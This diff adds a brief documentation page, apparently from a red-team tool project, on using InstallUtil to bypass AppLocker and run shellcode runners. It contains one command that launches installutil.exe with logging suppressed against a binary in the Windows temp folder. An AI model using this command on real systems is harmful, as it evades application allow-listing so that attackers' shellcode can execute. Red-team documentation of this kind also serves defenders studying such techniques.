@@ -1,0 +1,12 @@
+---
+title: "InstallUtil (AppLocker Bypass)"
+description: "Execute shellcode runners via InstallUtil."
+---
+
+Template located at `Templates/Applocker/`. Executes via reflection by default.
+
+## Execution
+
+```cmd
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\Windows\Temp\InstallUtil.exe
+```
